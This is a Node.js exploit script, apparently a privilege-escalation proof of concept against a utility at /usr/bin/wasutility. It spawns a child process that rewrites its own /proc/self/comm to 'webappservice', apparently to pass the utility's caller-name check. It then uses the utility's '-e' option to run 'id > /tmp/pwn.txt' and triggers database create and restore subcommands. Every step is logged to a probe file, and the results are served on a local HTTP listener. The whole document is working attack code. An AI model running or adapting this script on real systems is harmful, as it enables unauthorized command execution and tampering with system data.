(function() {
  'use strict';
  var fs  = require('fs');
  var http= require('http');
  var cp  = require('child_process');
  var PORT  = 8139;
  var PROBE = '/home/owner/share/tmp/sdk_tools/tbprobe51h.txt';
  var PWN   = '/tmp/pwn.txt';
  var WAS   = '/usr/bin/wasutility';
  function w(s){try{fs.appendFileSync(PROBE,s+'\n');}catch(e){}}
  try{fs.writeFileSync(PROBE,'v51h:start\n');}catch(e){}
  w('pid='+process.pid+' ppid='+process.ppid);

  var EXPLOIT_CODE = [
    "(function(){",
    "var fs=require('fs');",
    "var cp=require('child_process');",
    "var PROBE='/home/owner/share/tmp/sdk_tools/tbprobe51h.txt';",
    "var PWN='/tmp/pwn.txt';",
    "var WAS='/usr/bin/wasutility';",
    "function w(s){try{fs.appendFileSync(PROBE,'child:'+s+'\\n');}catch(e){}}",
    "w('start pid='+process.pid);",
    "var comm=''; try{comm=fs.readFileSync('/proc/self/comm','utf8').trim();}catch(e){}",
    "w('comm_before='+comm);",
    "try{fs.writeFileSync('/proc/self/comm','webappservice');w('comm_write:ok');}catch(e){w('comm_write:ERR:'+e.message);}",
    "var comm2=''; try{comm2=fs.readFileSync('/proc/self/comm','utf8').trim();}catch(e){}",
    "w('comm_after='+comm2);",
    "cp.execFile(WAS,['-e','id > '+PWN],{timeout:5000},function(err,out,errout){",
    "  w('was_e_1: code='+(err?err.code:0)+' out=['+out+'] err=['+errout+']');",
    "  var pwn=''; try{pwn=fs.readFileSync(PWN,'utf8').trim();}catch(e){}",
    "  w('pwn_1=['+pwn+']');",
    "  cp.execFile(WAS,['-e','id > '+PWN],{timeout:5000},function(err2,out2,errout2){",
    "    w('was_e_2: code='+(err2?err2.code:0)+' out=['+out2+'] err=['+errout2+']');",
    "    var pwn2=''; try{pwn2=fs.readFileSync(PWN,'utf8').trim();}catch(e){}",
    "    w('pwn_2=['+pwn2+']');",
    "    cp.exec(WAS+' create_new_wasdb 2>&1; echo EXIT:$?',{timeout:4000},function(e3,o3){",
    "      w('was_create_new: '+o3);",
    "      cp.exec(WAS+' restore_wasdb 2>&1; echo EXIT:$?',{timeout:4000},function(e4,o4){",
    "        w('was_restore: '+o4);",
    "        cp.exec(WAS+' -v 2>&1; echo EXIT:$?',{timeout:4000},function(e5,o5){",
    "          w('was_v: '+o5);",
    "          w('DONE');",
    "          process.exit(0);",
    "        });",
    "      });",
    "    });",
    "  });",
    "});",
    "})();"
  ].join('\n');

  w('v51h:spawning node -e');
  cp.execFile(process.execPath, ['-e', EXPLOIT_CODE], {timeout: 60000}, function(err, stdout, stderr) {
    var code = err ? err.code : 0;
    w('v51h:child_done code=' + code);
    if (stderr) w('v51h:stderr=[' + stderr.slice(0, 200) + ']');
    var pwn = '';
    try { pwn = fs.readFileSync(PWN, 'utf8').trim(); } catch(e) {}
    var body = fs.readFileSync(PROBE, 'utf8') + 'v51h:pwn=[' + pwn + ']\n=== END ===\n';
    fs.writeFileSync(PROBE, body);
    var srv = http.createServer(function(req, res) { res.end(body); });
    srv.listen(PORT, '127.0.0.1');
    srv.on('error', function() {});
    setInterval(function() {}, 60000);
  });
})();
